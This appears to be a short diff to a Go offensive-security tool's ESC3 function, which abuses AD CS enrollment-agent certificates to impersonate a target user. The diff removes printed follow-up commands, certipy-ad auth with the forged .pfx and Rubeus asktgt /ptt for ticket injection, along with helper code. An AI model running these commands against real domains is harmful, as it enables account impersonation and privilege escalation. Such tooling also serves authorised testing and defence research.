@@ -4,7 +4,6 @@ import (
 	"crypto"
 	"crypto/x509"
 	"fmt"
-	"strings"
 )
 
 // ekuCertificateRequestAgent is the OID for the Certificate Request Agent EKU,
@@ -120,15 +119,7 @@ func ExploitESC3(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 		return nil, nil, fmt.Errorf("enroll target cert via agent: %w", err)
 	}
 
-	upnUser := targetUPN
-	if idx := strings.Index(upnUser, "@"); idx > 0 {
-		upnUser = upnUser[:idx]
-	}
 	fmt.Printf("[+] Stage 2 complete: certificate obtained for %s via enrollment agent\n", targetUPN)
 	fmt.Printf("[+] ESC3 exploitation successful — two-stage enrollment agent attack\n")
-	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
-	fmt.Printf("    # The certificate was issued via enrollment agent on template: %s\n", templateName)
 	return cert, certKey, nil
 }
